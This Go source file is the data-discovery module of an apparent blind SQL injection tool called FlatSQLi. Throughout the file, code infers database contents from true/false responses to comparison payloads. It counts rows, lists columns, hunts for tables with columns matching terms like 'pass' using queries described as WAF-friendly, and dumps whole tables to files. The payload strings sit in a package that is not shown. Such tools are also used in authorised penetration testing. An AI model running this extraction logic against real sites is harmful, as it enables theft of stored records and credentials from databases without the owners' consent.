package finder

import (
	"fmt"
	"os"
	"strings"

	"github.com/morkin1792/flatsqli/internal/calibrator"
	"github.com/morkin1792/flatsqli/internal/detector"
	"github.com/morkin1792/flatsqli/internal/payloads"
	"github.com/morkin1792/flatsqli/internal/requester"
	"github.com/morkin1792/flatsqli/internal/storage"
	"github.com/morkin1792/flatsqli/internal/ui"
)

// WriteOutputFile writes the extracted data to a structured output file
func WriteOutputFile(outputPath string, data []TableData) error {
	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	fmt.Fprintf(file, "FlatSQLi Extraction Results\n")
	fmt.Fprintf(file, "===========================\n\n")

	for _, table := range data {
		writeTableToFile(file, table)
	}

	return nil
}

// InitOutputFile creates the output file with header
func InitOutputFile(outputPath string) error {
	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	fmt.Fprintf(file, "# FlatSQLi Extraction Results\n\n")
	return nil
}

// AppendTableToOutput appends a table's data to the output file
func AppendTableToOutput(outputPath string, table TableData) error {
	file, err := os.OpenFile(outputPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	writeTableToFile(file, table)
	return nil
}

// writeTableToFile writes a single table's data to a file in markdown format
func writeTableToFile(file *os.File, table TableData) {
	fmt.Fprintf(file, "## %s\n\n", table.TableName)
	if table.RowCount != 0 {
		fmt.Fprintf(file, "* **Rows:** %s\n", formatRowCount(table.RowCount))
		fmt.Fprintf(file, "* **Dumped Rows:** %d\n\n", len(table.Rows))
	} else {
		fmt.Fprintf(file, "* **Rows:** %d\n\n", len(table.Rows))
	}

	// Build markdown table header
	fmt.Fprintf(file, "| %s |\n", strings.Join(table.Columns, " | "))

	// Build separator row (--- for each column)
	separators := make([]string, len(table.Columns))
	for i := range separators {
		separators[i] = "---"
	}
	fmt.Fprintf(file, "| %s |\n", strings.Join(separators, " | "))

	// Print each row
	for _, row := range table.Rows {
		var values []string
		for j := range table.Columns {
			if j < len(row) {
				values = append(values, row[j])
			} else {
				values = append(values, "")
			}
		}
		fmt.Fprintf(file, "| %s |\n", strings.Join(values, " | "))
	}
	fmt.Fprintf(file, "\n")
}

// ColumnMatch represents a found column matching the pattern
type ColumnMatch struct {
	TableName  string
	ColumnName string
}

// TableData represents extracted data from a table
type TableData struct {
	TableName string
	Columns   []string
	Rows      [][]string
	RowCount  int // estimated total row count (-1 for 1M+)
}

// Finder handles critical data discovery
type Finder struct {
	requester   *requester.Requester
	calibration *calibrator.CalibrationResult
	dbType      detector.DatabaseType
	payloadGen  payloads.DatabasePayloads
	verbose     bool
	maxLen      int
	host        string
}

// New creates a new Finder
func New(req *requester.Requester, cal *calibrator.CalibrationResult, dbType detector.DatabaseType, verbose bool, host string) *Finder {
	return &Finder{
		requester:   req,
		calibration: cal,
		dbType:      dbType,
		payloadGen:  payloads.GetPayloadsForDatabase(dbType.ToPayloadType()),
		verbose:     verbose,
		maxLen:      70,
		host:        host,
	}
}

// SetMaxLen sets the maximum extraction length
func (f *Finder) SetMaxLen(maxLen int) {
	f.maxLen = maxLen
}

// DumpTable dumps rows from a specific table
func (f *Finder) DumpTable(tableName string, rowLimit int, outputFile string) error {
	ui.Info("Dumping table: %s", tableName)

	// Get row count
	ui.Progress("Counting rows in %s...", tableName)
	rowCount, err := f.GetRowCount(tableName)
	if err != nil {
		ui.ProgressDone()
		return fmt.Errorf("failed to get row count: %w", err)
	}
	ui.ProgressDone()
	ui.Info("Table has %s rows", formatRowCount(rowCount))

	if rowCount == 0 {
		ui.Info("Table is empty, nothing to dump")
		return nil
	}

	// Get columns - check cache first
	var columns []string
	cachedColumns := storage.GetTableColumns(f.host, tableName)
	if len(cachedColumns) > 0 {
		// Validate cached columns count
		actualCount, err := f.GetColumnCount(tableName)
		if err == nil && actualCount == len(cachedColumns) {
			columns = cachedColumns
			ui.Info("Using %d cached columns", len(columns))
		}
	}

	if len(columns) == 0 {
		ui.Info("Retrieving columns...")
		var err error
		columns, err = f.GetTableColumns(tableName, func(colName string) {
			_ = storage.AddTableColumn(f.host, tableName, colName)
		})
		if err != nil {
			return fmt.Errorf("failed to get columns: %w", err)
		}
		ui.Info("Found %d columns: %s", len(columns), strings.Join(columns, ", "))
	}

	// Determine actual rows to extract
	actualLimit := rowLimit
	if rowCount > 0 && rowCount < rowLimit {
		actualLimit = rowCount
	}

	// Initialize output file with table header
	if outputFile != "" {
		if err := initTableHeader(outputFile, tableName, rowCount, columns); err != nil {
			ui.Verbose(f.verbose, "Failed to create output file: %v", err)
		}
	}

	// Extract rows incrementally
	ui.Info("Extracting %d rows...", actualLimit)
	var rows [][]string
	for rowIdx := 0; rowIdx < actualLimit; rowIdx++ {
		row, err := f.extractSingleRow(tableName, columns, rowIdx)
		if err != nil {
			ui.Verbose(f.verbose, "Failed to extract row %d: %v", rowIdx+1, err)
			continue
		}

		// Check if row has data
		hasData := false
		for _, v := range row {
			if v != "" {
				hasData = true
				break
			}
		}
		if !hasData {
			break // No more rows
		}

		rows = append(rows, row)

		// Save to cache
		rowMap := make(map[string]string)
		for i, col := range columns {
			if i < len(row) {
				rowMap[col] = row[i]
			}
		}
		_ = storage.AddTableRow(f.host, tableName, rowMap)

		// Append row to output file immediately
		if outputFile != "" {
			if err := appendRowToFile(outputFile, row); err != nil {
				ui.Verbose(f.verbose, "Failed to append row to output: %v", err)
			}
		}
	}

	tableData := TableData{
		TableName: tableName,
		Columns:   columns,
		Rows:      rows,
		RowCount:  rowCount,
	}

	if outputFile != "" {
		// Add blank line after table
		appendNewlineToFile(outputFile)
		ui.Info("Output written to: %s", outputFile)
	}

	// Print results
	PrintTableData(tableData)

	return nil
}

// initTableHeader writes the table header to file
func initTableHeader(outputPath, tableName string, rowCount int, columns []string) error {
	file, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer file.Close()

	fmt.Fprintf(file, "# FlatSQLi Extraction Results\n\n")
	fmt.Fprintf(file, "## %s\n\n", tableName)
	fmt.Fprintf(file, "* **Rows:** %s\n\n", formatRowCount(rowCount))

	// Build markdown table header
	fmt.Fprintf(file, "| %s |\n", strings.Join(columns, " | "))

	// Build separator row
	separators := make([]string, len(columns))
	for i := range separators {
		separators[i] = "---"
	}
	fmt.Fprintf(file, "| %s |\n", strings.Join(separators, " | "))

	return nil
}

// appendRowToFile appends a single row to the output file
func appendRowToFile(outputPath string, row []string) error {
	file, err := os.OpenFile(outputPath, os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	fmt.Fprintf(file, "| %s |\n", strings.Join(row, " | "))
	return nil
}

// appendNewlineToFile appends a newline to the output file
func appendNewlineToFile(outputPath string) {
	file, _ := os.OpenFile(outputPath, os.O_APPEND|os.O_WRONLY, 0644)
	if file != nil {
		fmt.Fprintf(file, "\n")
		file.Close()
	}
}

// extractSingleRow extracts one row from the table
func (f *Finder) extractSingleRow(tableName string, columns []string, rowIdx int) ([]string, error) {
	var row []string
	for colIdx, col := range columns {
		query := f.getCellQuery(tableName, col, rowIdx)

		if colIdx == 0 {
			ui.Progress("Row %d: extracting...", rowIdx+1)
		}

		value, err := f.extractString(query)
		if err != nil {
			if value != "" {
				value = fmt.Sprintf("%s [partial]", value)
			} else {
				value = fmt.Sprintf("[error: %v]", err)
			}
		}
		row = append(row, value)

		ui.Progress("Row %d: | %s", rowIdx+1, strings.Join(row, " | "))
	}
	ui.ProgressDone()

	return row, nil
}

// FindColumns searches for columns matching the given pattern
// Uses simple LIKE queries for each term (WAF-friendly, no regex)
func (f *Finder) FindColumns(pattern string, tableLimit int, onFound func(string)) ([]ColumnMatch, error) {
	var matches []ColumnMatch
	seenTables := make(map[string]bool)

	// Split pattern by comma to get individual search terms
	terms := strings.Split(pattern, ",")

	// Search for each term separately (WAF-friendly: short queries, no regex)
	for termIdx, term := range terms {
		term = strings.TrimSpace(term)
		if term == "" {
			continue
		}

		// Show live progress
		ui.Progress("Searching term %d/%d: %s", termIdx+1, len(terms), term)

		// Search columns matching this term
		for offset := 0; offset < 100; offset++ {
			// Stop if we've hit table limit
			if len(seenTables) >= tableLimit {
				break
			}

			// Get table_name at this offset for this term
			tableQuery := f.getTableAtOffsetSingleTerm(term, offset)
			// ui.Verbose(f.verbose, "Table query: %s", tableQuery) // Optional debug

			tableName, err := f.extractString(tableQuery)
			if err != nil || tableName == "" {
				break
			}

			// Deduplicate by table name
			tableKey := strings.ToLower(tableName)
			if seenTables[tableKey] {
				// We still need to continue scanning this term because there might be OTHER tables
				// matching this term at higher offsets.
				// However, `offset` corresponds to the Nth match.
				// If term "pass" matches 3 columns in "USERS", "USERS" appears 3 times.
				// We just skip the duplicates.
				continue
			}
			seenTables[tableKey] = true

			// Callback for real-time saving
			if onFound != nil {
				onFound(tableName)
			}

			// We don't extract column name to speed up and satisfy user request
			columnName := ""

			matches = append(matches, ColumnMatch{
				TableName:  tableName,
				ColumnName: columnName,
			})

			// Update progress with found match
			ui.Progress("Found table: %s", tableName)
		}
	}
	ui.ProgressDone()

	if len(matches) > 0 {
		ui.Success("Found %d columns in %d tables", len(matches), len(seenTables))
	}
	return matches, nil
}

// GetTableColumns gets all columns for a specific table
func (f *Finder) GetTableColumns(tableName string, onFound func(string)) ([]string, error) {
	var columns []string

	ui.Progress("Getting columns for %s...", tableName)

	for offset := 0; offset < 50; offset++ { // Max 50 columns per table
		query := f.getTableColumnAtOffset(tableName, offset)
		ui.Verbose(f.verbose, "Column query: %s", query)

		colName, err := f.extractString(query)
		if err != nil {
			if colName != "" {
				ui.Verbose(f.verbose, "Incomplete column name extracted: %s (ignoring)", colName)
			}
			ui.ProgressDone()
			return columns, err
		}
		if colName == "" {
			break
		}
		columns = append(columns, colName)
		if onFound != nil {
			onFound(colName)
		}
		ui.Progress("Getting columns for %s: %d found", tableName, len(columns))
	}
	ui.ProgressDone()

	return columns, nil
}

// GetRowCount returns an approximate row count for a table.
// Returns -1 if count is >= 1M (displayed as "+1M")
// Uses threshold checks for fast approximation, only exact for < 10 rows.
func (f *Finder) GetRowCount(tableName string) (int, error) {
	query := f.getRowCountQuery(tableName)

	// First check if > 0
	payload := f.payloadGen.GetComparisonPayload(query, 0)
	resp, err := f.requester.Send(payload)
	if err != nil {
		return 0, err
	}
	if !f.calibration.IsTrue(resp.Fingerprint) {
		return 0, nil
	}

	// Thresholds to check (descending)
	thresholds := []int{1000000, 100000, 10000, 1000, 100, 10}

	// Check from largest threshold
	for _, threshold := range thresholds {
		payload := f.payloadGen.GetComparisonPayload(query, threshold-1) // COUNT > threshold-1 means COUNT >= threshold
		resp, err := f.requester.Send(payload)
		if err != nil {
			return 0, err
		}

		if f.calibration.IsTrue(resp.Fingerprint) {
			// Count >= threshold
			if threshold == 1000000 {
				return -1, nil // Signal for "+1M"
			}
			// Return the threshold as approximate value (e.g., "~100K")
			return threshold, nil
		}
	}

	// Count is < 10, do exact binary search
	low := 1
	high := 9

	for low < high {
		mid := (low + high + 1) / 2
		payload := f.payloadGen.GetComparisonPayload(query, mid-1)
		resp, err := f.requester.Send(payload)
		if err != nil {
			return low, err
		}
		if f.calibration.IsTrue(resp.Fingerprint) {
			low = mid
		} else {
			high = mid - 1
		}
	}

	return low, nil
}

// GetColumnCount returns the exact number of columns in a table using binary search.
// Used to validate cached column counts.
func (f *Finder) GetColumnCount(tableName string) (int, error) {
	query := f.getColumnCountQuery(tableName)

	// First check if > 0
	payload := f.payloadGen.GetComparisonPayload(query, 0)
	resp, err := f.requester.Send(payload)
	if err != nil {
		return 0, err
	}
	if !f.calibration.IsTrue(resp.Fingerprint) {
		return 0, nil
	}

	// Binary search for exact count (max 100 columns expected)
	low := 1
	high := 100

	for low < high {
		mid := (low + high + 1) / 2
		payload := f.payloadGen.GetComparisonPayload(query, mid-1)
		resp, err := f.requester.Send(payload)
		if err != nil {
			return low, err
		}
		if f.calibration.IsTrue(resp.Fingerprint) {
			low = mid
		} else {
			high = mid - 1
		}
	}

	return low, nil
}

// ExtractTableRows extracts rows from a table
func (f *Finder) ExtractTableRows(tableName string, columns []string, rowLimit int) ([][]string, error) {
	var rows [][]string

	for rowIdx := 0; rowIdx < rowLimit; rowIdx++ {
		var row []string
		hasData := false

		for colIdx, col := range columns {
			// Build query to get this cell
			query := f.getCellQuery(tableName, col, rowIdx)

			// Show live progress
			if colIdx == 0 {
				ui.Progress("Row %d: extracting...", rowIdx+1)
			}

			value, err := f.extractString(query)
			if err != nil {
				if value != "" {
					value = fmt.Sprintf("%s [partial]", value)
				} else {
					value = fmt.Sprintf("[error: %v]", err)
				}
			}
			if value != "" {
				hasData = true
			}
			row = append(row, value)

			// Update progress with current values
			ui.Progress("Row %d: | %s", rowIdx+1, strings.Join(row, " | "))
		}
		ui.ProgressDone()

		if !hasData {
			break // No more rows
		}

		rows = append(rows, row)
	}

	return rows, nil
}

// PrintTableData prints extracted table data in a nice format
func PrintTableData(data TableData) {
	fmt.Printf("\nTable: %s\n", data.TableName)
	fmt.Printf("  Columns: %s\n", strings.Join(data.Columns, ", "))
	fmt.Println("  " + strings.Repeat("─", 50))

	for i, row := range data.Rows {
		fmt.Printf("  Row %d: | %s |\n", i+1, strings.Join(row, " | "))
	}
}

// GroupByTable groups column matches by table name
func GroupByTable(matches []ColumnMatch) map[string][]string {
	result := make(map[string][]string)
	for _, m := range matches {
		result[m.TableName] = append(result[m.TableName], m.ColumnName)
	}
	return result
}
